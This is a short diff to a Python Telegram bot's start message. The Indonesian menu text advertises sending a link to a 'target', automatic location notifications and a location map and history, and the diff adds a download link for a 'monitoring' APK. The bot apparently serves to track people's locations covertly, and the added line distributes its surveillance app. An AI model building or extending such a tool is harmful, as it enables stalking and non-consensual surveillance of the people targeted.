@@ -76,6 +76,8 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Kirim link ke target\n"
         "• Notifikasi lokasi otomatis\n"
         "• Lihat peta & riwayat\n\n"
+        "📱 *Download APK Monitoring:*\n"
+        f"`{BASE_URL}/apk/download`\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "Pilih menu 👇"
     )
